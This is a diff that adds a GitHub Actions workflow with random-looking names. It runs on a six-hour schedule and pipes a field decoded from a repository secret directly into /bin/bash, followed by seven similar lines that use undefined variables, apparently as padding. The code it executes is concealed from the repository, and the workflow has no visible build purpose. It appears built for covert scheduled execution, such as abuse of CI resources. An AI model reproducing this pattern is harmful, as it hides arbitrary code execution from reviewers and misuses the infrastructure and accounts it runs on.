@@ -1,0 +1,23 @@
+name: qucaisiwen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qucaisiwen
+        env:
+          mju180: ${{ secrets.mju180 }}
+        run: |
+          echo $mju180 | jq -r .ergz759 | /bin/bash
+          echo $ap5 | jq -r .hws09842 | /bin/bash
+          echo $v85615 | jq -r .lw092 | /bin/bash
+          echo $gkp5996 | jq -r .k40 | /bin/bash
+          echo $lvdaf93817 | jq -r .nctmy91873 | /bin/bash
+          echo $eon3025 | jq -r .cew5217 | /bin/bash
+          echo $wsb28 | jq -r .f1193 | /bin/bash
+          echo $izz62923 | jq -r .xo1 | /bin/bash
+
